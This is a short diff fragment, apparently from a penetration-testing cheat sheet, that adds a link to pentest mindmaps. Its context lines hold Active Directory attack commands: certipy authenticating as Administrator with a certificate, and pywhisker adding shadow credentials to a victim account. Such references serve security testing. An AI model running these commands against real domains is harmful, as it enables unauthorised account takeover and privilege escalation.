@@ -80,3 +80,4 @@ certipy auth -pfx Administrator.pfx -dc-ip <DC_IP>
 pywhisker -d <domain> -u user -p 'Pass' --target victim --action add
 
 ```
+If you're stuck, look at https://orange-cyberdefense.github.io/ocd-mindmaps/
